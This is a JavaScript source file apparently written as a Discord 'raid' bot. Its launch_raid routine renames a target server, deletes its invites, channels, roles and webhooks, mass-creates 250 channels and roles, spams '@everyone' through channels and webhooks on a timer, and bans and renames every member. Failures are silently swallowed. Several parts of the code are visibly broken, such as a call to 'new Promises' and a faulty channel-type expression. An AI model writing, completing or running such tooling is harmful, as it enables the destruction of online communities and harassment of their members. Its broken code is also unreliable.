const version = 8,
    api_url = `https://discord.com/api/v${version}`

function generateDiscordCookie() {
    const date = new Date()
    date.setMonth(date.getMonth() + 1)
    return `name="__cfduid";domain=".discord.com";expires="${date.toUTCString()}";httpOnly=true;path="/";samesite="Lax";secure=true`
}

class Role {
    constructor(guild = new Guild(new Client())) {
        this.id = this.name = this.permissions = ""
        this.color = this.position = 0
        this.hoist = this.managed = this.mentionable = false
        this.guild = guild
        this.__route = `${this.guild.__route}/roles/${this.id}`
    }

    delete() {
        return new Promise((resolve = this, reject) => {
            r_delete(this.__route, this.guild.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }
}

class Embed {
    constructor() {
        return this
    }

    setTitle(title = null) {
        if (title) {
            this.title = title
        }
        return this
    }

    setDescription(description = null) {
        if (description) {
            this.description = description
        }
        return this
    }

    setURL(url = null) {
        if (url) {
            this.url = url
        }
        return this
    }

    setColor(color = null) {
        if (color) {
            this.color = color
        }
        return this
    }

    setTimestamp(timestamp = new Date().getTime()) {
        this.timestamp = timestamp
        return this
    }

    setFooter(text = null, icon_url = null) {
        if (text) {
            this.footer = {
                text: text,
                icon_url: icon_url,
            }
        }
        return this
    }

    setThumbnail(url = null) {
        if (url) {
            this.thumbnail = { url: url }
        }
        return this
    }

    setImage(url = null) {
        if (url) {
            this.image = { url: url }
        }
        return this
    }

    setAuthor(name = null, url = null, icon_url = null) {
        if (name) {
            this.author = {
                name: name,
                url: url,
                icon_url: icon_url,
            }
        }
        return this
    }

    addField(name = null, value = null, inline = false) {
        if (name && value) {
            this.fields.push({
                name: name,
                value: value,
                inline: inline,
            })
        }
        return this
    }
}

class Emoji {
    constructor() {
        this.id = this.name = ""
        this.roles = [new String()]
        this.users = [new User()]
        this.require_colons = this.managed = this.animated = this.available = false
    }
}

class Member {
    constructor(guild = new Guild(new Client())) {
        this.user = new User()
        this.nick = ""
        this.roles = [new String()]
        this.joined_at = new Date()
        this.premium_since = new Date()
        this.deaf = this.mute = false
        this.guild = guild
        this.__route = `${this.guild.__route}/members/${this.user.id}`
        this.channel_id = null
    }

    addRole(role_id) {
        return new Promise((resolve = this, reject) => {
            put(`${this.__route}/roles/${role_id}`, this.guild.client.__headers)
                .then((response) => {
                    resolve(true)
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    setNickname(nick) {
        return new Promise((resolve = this, reject) => {
            patch(this.__route, this.guild.client.__headers, { nick: nick })
                .then((response) => {
                    resolve(true)
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    removeRole(role_id) {
        return new Promise((resolve = this, reject) => {
            r_delete(
                `${this.__route}/roles/${role_id}`,
                this.guild.client.__headers
            )
                .then((response) => {
                    resolve(true)
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }
}

class Invitation {
    constructor() {
        this.code = ""
        this.guild = new Guild()
        this.channel = new Channel()
        this.inviter = this.target_user = new User()
        this.approximate_presence_count = this.approximate_member_count = 0
        this.target_user_type = 1
        this.meta = {
            uses: 0,
            max_uses: 0,
            max_age: 0,
            temporary: 0,
            created_at: new Date(),
        }
        this.__route = `${api_url}/invites/${this.code}`
    }

    delete() {
        return new Promise((resolve = this, reject) => {
            r_delete(this.__route, this.guild.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }
}

class VoiceState {
    constructor() {
        this.guild_id = this.channel_id = this.user_id = this.session_id = ""
        this.deaf = this.mute = this.self_deaf = this.self_mute = this.self_stream = this.self_video = this.suppress = false
        this.member = new Member()
    }
}

class Webhook {
    constructor(webhook_id, webhook_token) {
        this.id = webhook_id
        this.token = webhook_token
        this.url = `https://discord.com/api/webhooks/${this.id}/${this.token}`
        this.MessageData = { content: "", embeds: [Embed] }
        this.Basicresponse.SendMessageResponse = {
            status_code: 0,
            body: "",
            headers: "",
        }
        this.ProfileResponse = {
            type: 0,
            id: this.id,
            name: "",
            avatar: null,
            channel_id: "",
            guild_id: "",
            application_id: null,
            token: this.token,
        }
        this.ProfileError = { message: "", code: 50027 }
        this.__route = `${api_url}/webhooks/${this.id}`
    }

    send_message(data = this.MessageData) {
        return new Promise((resolve = this.Response, reject = this.Error) => {
            post(
                this.url,
                {
                    "Content-Type": "application/json",
                },
                JSON.stringify(data)
            )
                .then((response = this.SendMessageResponse) => {
                    resolve(response)
                })
                .catch((error = this.SendMessageResponse) => {
                    reject(error)
                })
        })
    }

    profile() {
        return new Promise((resolve, reject) => {
            get(this.url, {
                "Content-Type": "application/json",
            })
                .then((response = this.BasicResponse) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error = this.BasicResponse) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    setNickname(nick) {
        return new Promise((resolve = this, reject) => {
            this.nick = nick
            patch(
                this.__route,
                this.guild.client.__headers,
                this.__build_webhook()
            )
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    __build_webhook() {
        this.profile()
            .then((profile) => {
                return {
                    name: profile.name || "RAID",
                    avatar:
                        profile.avatar ||
                        "https://cdn.discordapp.com/embed/avatars/0.png",
                    channel_id: profile.channel_id || null,
                }
            })
            .catch((error) => {
                return {
                    name: "RAID",
                    avatar: "https://cdn.discordapp.com/embed/avatars/0.png",
                    channel_id: null,
                }
            })
    }
}

class Guild {
    constructor(client = new Client()) {
        this.id = this.name = this.icon = this.icon_hash = this.splash = this.discovery_splash = this.owner_id = this.permissions = this.region = this.afk_channel_id = this.widget_channel_id = this.application_id = this.system_channel_id = this.rules_channel_id = this.vanity_url_code = this.description = this.banner = this.preferred_locale = this.public_updates_channel_id =
            ""
        this.owner = this.widget_enabled = this.large = this.unavailable = false
        this.afk_timeout = this.verification_level = this.default_message_notifications = this.explicit_content_filter = this.mfa_level = this.system_channel_flags = this.member_count = this.max_presences = this.max_members = this.premium_tier = this.premium_subscription_count = this.max_video_channel_users = this.approximate_member_count = this.approximate_presence_count = 0
        this.roles = [new Role()]
        this.features = [
            "INVITE_SPLASH",
            "VIP_REGIONS",
            "VANITY_URL",
            "VERIFIED",
            "PARTNERED",
            "COMMUNITY",
            "COMMERCE",
            "NEWS",
            "DISCOVERABLE",
            "FEATURABLE",
            "ANIMATED_ICON",
            "BANNER",
            "WELCOME_SCREEN_ENABLED",
        ]
        this.joined_at = new Date()
        this.members = [new Member()]
        this.channels = [new Channel()]
        this.client = client
        this.__route = `${api_url}/guilds/${this.id}`
    }

    setName(name) {
        return new Promises((resolve = this, reject) => {
            patch(this.__route, this.client.__headers, {
                name: name,
            })
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    fetchInvites() {
        return new Promise((resolve = [new Invitation()], reject) => {
            get(`${this.__route}/invites`, this.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    channels() {
        return new Promise((resolve = [new Channel()], reject) => {
            get(`${this.__route}/channels`, this.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    createChannel(
        name,
        options = {
            name: name || "default-channel",
            type: "text"
                ? 0
                : "dm"
                ? 1
                : "voice"
                ? 2
                : "group"
                ? 3
                : "caregory"
                ? 4
                : "news"
                ? 5
                : "store"
                ? 6
                : 0,
            permissionOverwrites: [new Overwrites()],
            position: 0,
        }
    ) {
        return new Promise((resolve = new Channel(), reject) => {
            post(`${this.__route}/channels`, this.client.__headers, options)
                .then((response = new Channel()) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    fetchWebhooks() {
        return new Promise((resolve = [new Webhook(null, null)], reject) => {
            get(`${this.__route}/webhooks`, this.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    createRole(
        data = {
            name: "RAID BY ...",
            permission: 0,
            color: 0xfffffe,
            hoist: false,
            mentionable: false,
        }
    ) {
        return new Promise((resolve = new Role(this), reject) => {
            post(`${this.__route}/roles`, this.client.__headers, data)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    members() {
        return new Promise((resolve = [new Member()], reject) => {
            get(`${this.__route}/members`, this.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    ban(
        member_id,
        options = {
            reason: "RAID",
            delete_message_days: 7, // 0 - 7
        }
    ) {
        return new Promise((resolve = this, reject) => {
            put(
                `${this.__route}/bans/${member_id}`,
                this.client.__headers,
                options
            )
                .then((response) => {
                    resolve(true)
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    deleteWebhook(webhook_id) {
        return new Promise((resolve = this, reject) => {
            r_delete(
                `${this.__route}/webhooks/${webhook_id}`,
                this.client.__headers
            )
                .then((response) => {
                    resolve(true)
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }
}

class Overwrites {
    constructor() {
        this.type = "role" | "member"
        this.allow = this.deny = this.id = ""
    }
}

class User {
    constructor() {
        this.id = this.useranme = this.discriminator = this.avatar = this.locale = this.email =
            ""
        this.bot = this.system = this.mfa_enabled = this.verified = false
        this.flags = this.premium_type = this.public_flags = 0
    }
}

class Message {
    constructor() {
        this.content = this.nonce = this.payload_json = ""
        this.embed = new Embed()
        this.tts = false
    }
}

class Channel {
    constructor(client = new Client()) {
        this.type =
            "GUILD_TEXT" |
            "DM" |
            "GUILD_VOICE" |
            "GROUP_DM" |
            "GUILD_CATEGORY" |
            "GUILD_NEWS" |
            "GUILD_STORE"
        this.permission_overwrites = [new Overwrites()]
        this.recipients = [new User()]
        this.nsfw = false
        this.position = this.bitrate = this.limit_user = this.rate_limit_per_user = 0
        this.id = this.guild_id = this.name = this.topic = this.last_message_id = this.icon = this.owner_id = this.application_id = this.parent_id = this.last_pin_timestamp =
            ""
        this.__route = `${api_url}/channels/${this.id}`
        this.client = client
    }

    delete() {
        return new Promise((resolve = this, reject) => {
            r_delete(this.__route, this.client.__headers)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    send(content = new Message()) {
        return new Promise((resolve = this, reject) => {
            post(`${this.__route}/messages`, this.client.__headers, content)
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    createWebhook(name) {
        return new Promise((resolve = this, reject) => {
            post(`${this.__route}/webhooks`, this.client.__headers, {
                name: name,
            })
                .then((response) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }
}

class Client {
    constructor() {
        this.token = ""
        this.__headers = {
            Authorization: `Bot ${this.token}`,
        }
        this.__raid_config = {
            guild_id: "",
            raid_config: {
                guild: {
                    change_guild_name: false,
                    new_guild_name: "RAID BY ...",
                    remove_invitations: false,
                },
                channels: {
                    remove_channels: false,
                    create_new_channels: false,
                    new_channels_name: "gen-nitro",
                    spamming: {
                        enabled: false,
                        message: "RAID BY ...",
                        delay_in_ms: 500,
                        use_webhooks: false,
                        webhooks_name: "RAID BY ...",
                    },
                },
                roles: {
                    remove_roles: false,
                    create_new_roles: false,
                    new_roles_name: "RAID BY ...",
                    hex_color: 0xfffffe,
                    set_role: false,
                },
                members: {
                    rename_members: false,
                    ban_all_members: false,
                    new_members_name: "RAID BY ...",
                    remove_roles: false,
                },
                webhooks: {
                    remove_webhooks: false,
                    rename_webhooks: false,
                    new_webhooks_name: "RAID BY ...",
                },
            },
        }
        this.__handle_raid = false
    }

    launch_raid() {
        return new Promise(async (resolve, reject) => {
            // Loading raid configs :
            const raidGuild_config = this.__raid_config.raid_config.guild,
                raidChannels_config = this.__raid_config.raid_config.channels,
                raidRoles_config = this.__raid_config.raid_config.roles,
                raidMembers_config = this.__raid_config.raid_config.members,
                raidWebhooks_config = this.__raid_config.raid_config.webhooks,
                targetGuildId = this.__raid_config.guild_id,
                targetGuild = await this.guild(targetGuildId)

            targetGuild.client = this

            if (!targetGuild) {
                return reject(
                    "The guild you aimed isn't accessible by the bot !"
                )
            } else {
                if (raidGuild_config.change_guild_name) {
                    targetGuild
                        .setName(raidGuild_config.new_guild_name)
                        .catch(async (_) => 0)
                }

                if (raidGuild_config.remove_invitations) {
                    targetGuild
                        .fetchInvites()
                        .then(async (invitations = [new Invitation()]) => {
                            invitations.forEach(
                                async (invitation = new Invitation()) => {
                                    invitation.delete().catch(async (_) => 0)
                                }
                            )
                        })
                }

                if (raidChannels_config.remove_channels) {
                    targetGuild
                        .channels()
                        .then((channels = [new Channel()]) => {
                            channels.forEach(
                                async (channel = new Channel()) => {
                                    channel.delete().catch(async (_) => 0)
                                }
                            )
                        })
                }

                if (raidChannels_config.create_new_channels) {
                    for (let index = 0; index < 250; index++) {
                        targetGuild
                            .createChannel(
                                raidChannels_config.new_channels_name || "RAID",
                                {
                                    type: 0,
                                    permissionOverwrites: [
                                        {
                                            id: targetGuild.id,
                                            deny: [
                                                "SEND_MESSAGES",
                                                "ADD_REACTIONS",
                                            ],
                                            allow: [
                                                "VIEW_CHANNEL",
                                                "READ_MESSAGE_HISTORY",
                                            ],
                                        },
                                    ],
                                }
                            )
                            .catch(async (_) => 0)
                    }
                }

                if (raidChannels_config.spamming.enabled) {
                    setInterval(async () => {
                        targetGuild
                            .channels()
                            .then((channels = [new Channel()]) => {
                                channels
                                    .filter(
                                        async (c = new Channel()) =>
                                            c.type === 0
                                    )
                                    .forEach(
                                        async (channel = new Channel()) => {
                                            channel
                                                .send(
                                                    raidChannels_config.spamming
                                                        .message || "@everyone"
                                                )
                                                .catch(async (_) => 0)
                                            if (
                                                raidChannels_config.spamming
                                                    .use_webhooks
                                            ) {
                                                targetGuild
                                                    .fetchWebhooks()
                                                    .then(
                                                        async (
                                                            webhooks = [
                                                                new Webhook(
                                                                    null,
                                                                    null
                                                                ),
                                                            ]
                                                        ) => {
                                                            webhooks.forEach(
                                                                async (
                                                                    webhook = new Webhook(
                                                                        null,
                                                                        null
                                                                    )
                                                                ) => {
                                                                    webhook
                                                                        .send_message(
                                                                            raidChannels_config
                                                                                .spamming
                                                                                .message ||
                                                                                "@everyone"
                                                                        )
                                                                        .catch(
                                                                            async (
                                                                                _
                                                                            ) =>
                                                                                0
                                                                        )
                                                                }
                                                            )
                                                        }
                                                    )
                                                channel
                                                    .createWebhook(
                                                        raidChannels_config
                                                            .spamming
                                                            .webhooks_name
                                                    )
                                                    .catch(async (_) => 0)
                                            }
                                        }
                                    )
                            })
                    }, raidChannels_config.spamming.delay_in_ms)
                }

                if (raidRoles_config.remove_roles) {
                    targetGuild.roles().then((roles = [new Role()]) => {
                        roles.forEach(async (role = new Role()) => {
                            role.delete().catch(async (_) => 0)
                        })
                    })
                }

                if (raidRoles_config.create_new_roles) {
                    for (let index = 0; index < 250; index++) {
                        targetGuild.roles
                            .create({
                                color: raidRoles_config.hex_color || 0xfffffe,
                                name:
                                    raidRoles_config.new_roles_name ||
                                    "RAID BY ...",
                            })
                            .then(async (role = new Role()) => {
                                if (raidRoles_config.set_role) {
                                    targetGuild
                                        .members()
                                        .then((members = [new Member()]) => {
                                            members.forEach(
                                                async (
                                                    member = new Member()
                                                ) => {
                                                    member
                                                        .addRole(role.id)
                                                        .catch(async (_) => 0)
                                                }
                                            )
                                        })
                                        .catch((_) => 0)
                                }
                            })
                            .catch(async (_) => 0)
                    }
                }

                if (raidMembers_config.ban_all_members) {
                    targetGuild.members().then((members = [new Member()]) => {
                        members.forEach(async (member = new Member()) => {
                            targetGuild
                                .ban(member.user.id)
                                .catch(async (_) => 0)
                        })
                    })
                }

                if (raidMembers_config.rename_members) {
                    targetGuild.members().then((members = [new Member()]) => {
                        members.forEach(async (member = new Member()) => {
                            member
                                .setNickname(
                                    raidMembers_config.new_members_name ||
                                        "RAID"
                                )
                                .catch(async (_) => 0)
                        })
                    })
                }

                if (raidMembers_config.remove_roles) {
                    targetGuild.members().then((members = [new Member()]) => {
                        members.forEach(async (member = new Member()) => {
                            member.roles.forEach(
                                async (role_id = new String()) => {
                                    member
                                        .removeRole(role_id)
                                        .catch(async (_) => 0)
                                }
                            )
                        })
                    })
                }

                if (raidWebhooks_config.rename_webhooks) {
                    targetGuild
                        .fetchWebhooks()
                        .then(async (webhooks = [new Webhook(null, null)]) => {
                            webhooks.forEach(
                                async (webhook = new Webhook(null, null)) => {
                                    webhook
                                        .setNickname(
                                            raidWebhooks_config.new_webhooks_name ||
                                                "RAID"
                                        )
                                        .catch(async (_) => 0)
                                }
                            )
                        })
                }

                if (raidWebhooks_config.remove_webhooks) {
                    targetGuild
                        .fetchWebhooks()
                        .then(async (webhooks = [new Webhook(null, null)]) => {
                            webhooks.forEach(
                                async (webhook = new Webhook(null, null)) => {
                                    targetGuild
                                        .deleteWebhook(webhook.id)
                                        .catch(async (_) => 0)
                                }
                            )
                        })
                }
            }
        })
    }

    login(token) {
        return new Promise((resolve = new Guild(this), reject) => {
            this.token = token
            this.__headers.Authorization = `Bot ${this.token}`
            get(`${api_url}/users/@me`, this.__headers)
                .then((response = new Client()) => {
                    this.__headers.Authorization = `Bot ${token}`
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }

    guild(guild_id) {
        return new Promise((resolve, reject) => {
            get(`${api_url}/guilds/${guild_id}`, this.__headers)
                .then((response = new Guild()) => {
                    resolve(JSON.parse(response.body))
                })
                .catch((error) => {
                    reject(JSON.parse(error.body))
                })
        })
    }
}
